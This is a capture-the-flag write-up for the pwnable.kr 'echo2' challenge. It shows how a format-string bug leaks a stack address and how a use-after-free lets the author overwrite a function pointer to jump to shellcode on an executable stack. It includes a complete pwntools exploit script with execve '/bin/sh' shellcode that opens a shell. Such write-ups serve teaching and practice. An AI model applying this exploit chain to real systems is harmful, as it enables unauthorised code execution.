---
layout: post
title: Pwnable/Echo2
date: 2026-03-21 22:46 +0530
categories: [Writeup,Pwn, Pwnable.kr]
---


>Pwn this echo service.
>
ssh echo2@pwnable.kr -p2222 (pw: guest)

### Analysis

We are provided with an executable of an echo service. After running the code, it was offering us three ways to perform an echo:-
1. BOF echo ( Buffer Overflow vulnerability )
2. FSB echo ( Format string vulnerability )
3. UAF echo ( Use after free vulnerability )

However the BOF echo hadn't been implemented yet :( , then I had to utilize the FSB and UAF echo service.

```python
p.sendline(b"2")
p.sendline(b"%p"*9)
```

This leaks the stack address using the FSB echo service. Notice that the stack is also executable.

The UAF section simply just mallocs a chunk of size 0x20, puts the content from the stdin into the chunk, echo's the content of the chunk and frees the chunk. Initially I couldn't see why this service was called the UAF echo.

However after further inspection, there was a cleanup funtion in the code.

![Desktop View](assets/img/pwnable/echo2-ida-cleanup.png){: width="400" height="800" }

If we freed the 'o' chunk, then in the UAF function, it can be malloced and then we can overwrite the contents of the 'o' chunk. SInce this chunk contains the address of functions greetings and goodbye, we can overwrite the greetings function to the shellcode which was present in the stack.


![Desktop View](assets/img/pwnable/echo2-stack-shellcode.png){: width="600" height="300" }


### Exploit

```python

import pwn
from pwn import *

context.terminal=["tmux","splitw","-h"]
context.arch="amd64"
context.os="linux"



shellcode=asm('''
        xor rdx, rdx
        xor rax, rax
        mov al, 0x3B
        lea rdi,[rip+_binsh]
        syscall
        _binsh:
            .string "/bin/sh"
        
''')

print("Length of shellcode:",len(shellcode))

p=process("127.0.0.1",9011)
p.sendline(shellcode)


p.sendline(b"2")
p.sendline(b"%p"*9) ## Format string vulnerability:-This leaks out the stack

_=p.recvuntil(b"hello ")
_=p.recvline()
stack_addr=int(p.recvline()[-13:-1].decode(),16)-0x20
print("stack_addr:",hex(stack_addr))


p.sendline(b"4") ## Freeing the 'o' chunk which contains the address of hte greeting and goodbye functions
p.sendline(b"n")

p.sendline(b"3") ## Here the malloc function allocates the 'o' chunk again
content=b"/bin//sh"*3+p64(stack_addr)
print("Cyclic pattern being sent:",content) ## Now we are able to overwrite the greetings function with our shellcode function at the leaked stack address
p.sendline(content)

p.sendline(b"2") ## Calling echo2 function which calls the greeting function but now our shellcode will get executed instead
p.sendline(b"hello")

p.interactive()
```

### Output

![Desktop View](assets/img/pwnable/echo2-output.png){: width="600" height="300" }